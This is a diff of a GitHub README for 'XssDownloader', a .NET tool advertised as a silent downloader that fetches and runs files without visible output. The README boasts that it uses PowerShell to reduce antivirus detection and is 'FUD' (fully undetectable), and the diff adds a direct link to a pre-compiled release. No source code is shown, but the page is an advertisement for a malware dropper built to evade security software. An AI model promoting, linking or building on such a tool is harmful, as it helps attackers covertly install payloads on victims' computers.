@@ -1,23 +1,23 @@
-
-<img src=".png?raw=true">
+# XssDownloader
+<img src="https://github.com/xssis57/XssDownloader/blob/main/XssDownloader/Builder/Images/1.png?raw=true">
 
 # XssDownloader 1.0.0 - A free silent downloader
 
 A free silent (hidden) open-source downloader (Downloader .NET C#) file.
 
-## Main Features
+## **Main Features**
 
 * Silent - Downloads and executes files without any visible output
 * Powershell - Does everything through powershell which currently greatly reduces detections
 * Compatible - Supports all tested Windows versions (Windows 7 to Windows 11)
 * This project is FUD on the day of release (December 2025). 
 
-## Downloads
+## **Downloads**
 
-Pre-Compiled: 
+Pre-Compiled: https://github.com/xssis57/XssDownloader/releases/download/Xss/XssDownloader.zip
 
 
-## Contributing
+## **Contributing**
 
 Pull requests are welcome. For major changes, please open an issue first
 to discuss what you would like to change.
